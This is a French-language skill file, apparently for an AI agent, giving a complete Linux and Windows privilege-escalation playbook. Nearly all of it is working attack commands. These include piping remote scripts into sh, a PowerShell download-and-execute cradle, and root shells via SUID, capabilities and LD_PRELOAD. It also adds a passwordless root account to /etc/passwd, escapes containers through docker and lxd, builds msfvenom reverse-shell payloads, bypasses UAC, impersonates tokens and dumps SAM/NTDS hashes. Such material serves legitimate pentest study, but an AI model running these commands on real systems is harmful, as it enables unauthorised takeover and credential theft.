---
name: privilege-escalation
description: Guide complet d'élévation de privilèges Linux et Windows — linPEAS, winPEAS, SUID, sudo, capabilities, cron, PATH, services, DLL hijacking, token impersonation.
---

# Élévation de Privilèges — Guide Complet Linux & Windows

---

## Linux — Élévation de privilèges

### Énumération automatisée
```bash
# LinPEAS — Le meilleur outil d'énumération
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh

# LinEnum — Alternative
curl -L https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | sh

# pspy — Surveiller les processus (cron jobs)
wget https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64
chmod +x pspy64 && ./pspy64
```

### Vecteurs d'élévation courants

#### 1. Sudo — La base
```bash
# Voir ce qu'on peut sudo
sudo -l

# Si (ALL : ALL) ALL → sudo su -
# Si (user) NOPASSWD: /chemin/script → GTFOBins !

# Commandes dangereuses exploitables via sudo :
# → man, less, more, awk, perl, python, find, vim, systemctl...
# → Vérifier https://gtfobins.github.io pour chaque binaire
```

#### 2. SUID / SGID
```bash
# Trouver tous les binaires SUID
find / -perm -4000 -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null

# Exemples classiques exploitables :
# → /bin/bash (SUID) → bash -p
# → /usr/bin/python → python -c 'import os; os.setuid(0); os.system("/bin/sh")'
# → /usr/bin/find → find . -exec /bin/sh -p \; -quit

# SGID (groupes importants : adm, docker, lxd, shadow, disk...)
```

#### 3. Capabilities Linux
```bash
# Lister les capabilities
getcap -r / 2>/dev/null

# Dangereuses :
# cap_setuid+ep → ./python -c 'import os; os.setuid(0); os.system("/bin/sh")'
# cap_sys_admin+ep → Exploitation kernel
# cap_dac_read_search+ep → Lire /etc/shadow
# cap_net_raw+ep → Sniffing réseau
```

#### 4. Cron jobs
```bash
# Lister les cron jobs
cat /etc/crontab
ls -la /etc/cron.d/
crontab -l

# Si un script cron est modifiable par nous → backdoor
# Observer avec pspy les tâches exécutées par root
```

#### 5. PATH Hijacking
```bash
# Si un script exécute une commande sans chemin absolu
echo $PATH
# Si . est dans le PATH ou un répertoire modifiable devant
# Créer un faux binaire
echo '#!/bin/bash' > /tmp/ls
echo '/bin/bash -p' >> /tmp/ls
chmod +x /tmp/ls
export PATH=/tmp:$PATH
```

#### 6. Kernel Exploits
```bash
# Identifier la version du kernel
uname -a
cat /etc/os-release

# Rechercher des exploits
searchsploit linux kernel <version>
# Ou : https://github.com/lucyoa/kernel-exploits

# DirtyCow, DirtyPipe, PwnKit, OverlayFS... selon la version
```

#### 7. Docker / LXC
```bash
# Si membre du groupe docker
docker run -v /:/mnt --rm -it alpine chroot /mnt sh

# Si membre du groupe lxd
lxc init ubuntu:20.04 privesc -c security.privileged=true
lxc config device add privesc host-root disk source=/ path=/mnt recursive=true
lxc start privesc && lxc exec privesc -- /bin/sh
```

#### 8. Bibliothèques partagées (LD_PRELOAD)
```bash
# Si LD_PRELOAD est autorisé pour un binaire SUID
echo '#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
    setuid(0); setgid(0);
    system("/bin/bash -p");
}' > shell.c
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
sudo LD_PRELOAD=/tmp/shell.so /chemin/vers/binaire
```

#### 9. Fichiers et dossiers modifiables
```bash
# /etc/passwd modifiable
echo "root2::0:0:root:/root:/bin/bash" >> /etc/passwd
su root2

# /etc/shadow lisible
cat /etc/shadow | grep root
john root_hash.txt --wordlist=rockyou.txt

# Clés SSH lisibles
find / -name id_rsa 2>/dev/null
find / -name "*.pem" 2>/dev/null
```

---

## Windows — Élévation de privilèges

### Énumération automatisée
```cmd
# WinPEAS — l'outil indispensable
# Télécharger et exécuter depuis :
# https://github.com/peass-ng/PEASS-ng/releases
winPEASx64.exe

# PowerUp.ps1 (PowerSploit)
powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('...'); Invoke-AllChecks"

# Seatbelt
Seatbelt.exe -group=all

# Watson (vulnérabilités kernel)
Watson.exe
```

### Vecteurs d'élévation courants

#### 1. Token Impersonation (Potato family)
```bash
# PrintSpoofer (Windows 10, Server 2016/2019)
PrintSpoofer.exe -i -c "powershell -ep bypass"

# JuicyPotato (anciennes versions Windows)
juicypotato.exe -l 1337 -p c:\windows\system32\cmd.exe -t * -c {CLSID}

# RoguePotato / GodPotato / SweetPotato (selon version)
```

#### 2. Services mal configurés
```bash
# Lister les services non protégés
accesschk.exe -uwcqv "Authenticated Users" *
accesschk.exe -uwcqv "Tout le monde" *

# Si un service est modifiable et exécuté en SYSTEM :
sc config <Service> binpath= "C:\reverse.exe"
sc stop <Service> && sc start <Service>
```

#### 3. AlwaysInstallElevated
```bash
# Vérifier
reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# Si les deux sont à 1
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f msi -o shell.msi
msiexec /quiet /i shell.msi
```

#### 4. DLL Hijacking
```bash
# Trouver les DLL absentes chargées par un processus SYSTEM
# Avec Process Monitor : filtre sur NAME NOT FOUND et .dll

# Créer une DLL malveillante et la placer dans le chemin
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f dll -o hijack.dll
```

#### 5. UAC Bypass
```bash
# Méthodes classiques
# fodhelper.exe (Windows 10/11)
# eventvwr.exe
# computerdefaults.exe

# FodHelper bypass :
New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
Set-ItemProperty "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "cmd.exe"
Start-Process "C:\Windows\System32\fodhelper.exe"
```

#### 6. Credential hunting (Windows)
```bash
# Rechercher des credentials en clair
findstr /si password *.txt *.ini *.cfg *.config *.xml *.ps1 *.bat *.vbs

# Fichiers intéressants :
# unattend.xml, sysprep.inf, group.xml (GPP cpassword)
# web.config, .git/config

# Décrypter GPP cpassword :
gpp-decrypt <cpassword_encrypted>

# Historique PowerShell
type C:\Users\<user>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

#### 7. Kernel exploits
```bash
# Identifier la version Windows
systeminfo
wmic os get Caption,Version,BuildNumber

# Chercher des exploits
# https://github.com/SecWiki/windows-kernel-exploits
# MS16-032, MS17-010, CVE-2021-36934 (HiveNightmare)...
```

#### 8. SeBackupPrivilege / SeRestorePrivilege
```bash
# Avec SeBackupPrivilege activé :
whoami /priv

# Copier NTDS.dit et le registre
robocopy /b C:\Windows\NTDS\ C:\temp\

# Robocopy SAM/SYSTEM
reg save hklm\sam C:\temp\sam
reg save hklm\system C:\temp\system

# Extraire les hashs avec secretsdump.py
impacket-secretsdump -sam sam -system system LOCAL
```

---

## Cheatsheet rapide

```
==================================================
LINUX
==================================================
sudo -l                              # Vérifier sudo
find / -perm -4000 2>/dev/null       # Binaires SUID
getcap -r / 2>/dev/null              # Capabilities
cat /etc/crontab                     # Cron jobs
uname -a                             # Version kernel
id; groups                           # Groupes (docker, lxd)

==================================================
WINDOWS
==================================================
whoami /priv                         # Privilèges
whoami /groups                       # Groupes
systeminfo                           # Version OS
sc query state=all | findstr "SERVICE_NAME"
icacls "C:\Program Files\*" /T 2>nul | findstr "F Tout"
reg query HKLM\SOFTWARE\Policies\...
```

### Ressources

- **linPEAS/winPEAS** : https://github.com/peass-ng/PEASS-ng
- **GTFOBins** : https://gtfobins.github.io
- **LOLBAS (Windows)** : https://lolbas-project.github.io
- **HackTricks Linux PE** : https://book.hacktricks.xyz/linux-hardening/privilege-escalation
- **HackTricks Windows PE** : https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation